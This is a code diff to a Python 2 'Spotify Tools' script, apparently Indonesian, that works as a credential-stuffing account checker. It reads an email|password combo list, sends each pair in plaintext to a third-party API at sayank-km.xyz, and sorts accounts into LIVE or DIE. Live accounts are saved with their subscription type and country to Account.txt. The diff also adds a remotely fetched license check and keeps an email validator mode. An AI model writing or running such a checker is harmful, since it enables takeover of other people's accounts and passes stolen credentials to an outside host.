@@ -5,6 +5,7 @@ import time
 import sys
 import os
 import json
+from socket import timeout
 from termcolor import colored
 from colorama import Fore, Back, Style
 
@@ -30,10 +31,6 @@ for l in sangat:
 	sys.stdout.write(l)
 	sys.stdout.flush()
 	time.sleep(0.05)
-for l in kirnath:
-	sys.stdout.write(l)
-	sys.stdout.flush()
-	time.sleep(0.05)
 for l in coded:
 	sys.stdout.write(l)
 	sys.stdout.flush()
@@ -44,33 +41,53 @@ for l in me:
 	time.sleep(0.05)
 print hijau.format("                       Spotify Tools\n")
 def acc():
-	try:
-		emaillist = str(raw_input("Enter List File: "))
-	except FileNotFoundError as e:
-		print(e.errno)
-		print(e)
-
+	read_license = urllib2.urlopen("https://mee-kirnath.c9users.io/license.txt")
+	license = read_license.read()
+	input_license = str(raw_input("License?: "))
+	if input_license != license:
+		try:
+			print "License Not Valid !"
+			
+			sys.exit(1)
+			
+		except TypeError:
+			print "Exiting......"
 	else:
+		print "[+] License is Valid !"
+		time.sleep(2)
+		print "[+] Starting......."
+		time.sleep(2)
+		try:
+			emaillist = str(raw_input("[+] Enter List File: "))
+		except NameError:
+			print "[+] File Not Found!"
+			time.sleep(1)
+			print "[+] Exiting..."
+			sys.exit(2)
 		readfile = open(emaillist, "r")
-		pisah = emaillist.split("\n")
-		for i in readfile:
-			j = i.split("|")
-			a = j[0]
-			b = j[1]
-			respon = urllib2.urlopen("http://sayank-km.xyz/api/?email={}&pass={}".format(a,b))
+		done = hijau.format("[+] Done! Result was Saved as Account.txt")
+		for line in readfile:
+			data = line.split("|")
+			a = data[0]
+			b = data[1]
+
+			respon = urllib2.urlopen("http://sayank-km.xyz/api/?email={}&pass={}".format(a,b), timeout=360)
 			reason = respon.read()
 			resp = json.loads(reason)
+			data_b = (b).replace("\n", "")
 			if "success" not in reason:
-				print (Fore.RED + "DIE ==>"),a,"|",b
+				print (Fore.RED + "DIE ==>"),a,"|",data_b
 				
 			else:
-				print (Fore.GREEN + "LIVE ==>"),a,"|",b,"|","Type:",resp['subscription'],"|","Negara",resp['Negara']
-				live = "LIVE ==>",a,"|",b,"|","Type:",resp['subscription'],"|","Negara",resp['Negara']
+				negara = resp["Negara"]
+				data_negara = (negara[0]).replace("[", "")
+				print (Fore.GREEN + "LIVE ==>"),a,"|",data_b,"|","Type:",resp["subscription"],"|","Negara:",data_negara
+				live = "LIVE ==> {}|{}|Type: {}|Negara: {}".format(a,data_b,resp["subscription"],data_negara)
 				save = str(live)
 				file = open('Account.txt', 'a')
 				file.write(save+'\n')
-				done = merah.format("Done! Result was Saved as Account.txt")
-				print done
+				sleep.time(2)
+		print done
 def email():
 	try:
 		emaillist = str(raw_input("Enter List File: "))
@@ -95,10 +112,10 @@ def email():
 				print (Fore.GREEN + "LIVE ==>"),a
 				live = "LIVE ==>",a
 				save = str(live)
+				done = merah.format("Done! Result was Saved as Valid.txt")
 				file = open('Valid.txt', 'a')
 				file.write(save+'\n')
-				done = merah.format("Done! Result was Saved as Valid.txt")
-				print done
+			print done
 
 print "Menu :"
 print "1. Spotify Account Checker"
@@ -125,5 +142,3 @@ if (put == "2"):
 	print merah.format("\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|")
 	print merah.format("             -Spotify Email Validator")	
 	email()
-
-#SAVE RESULT KE FILE!
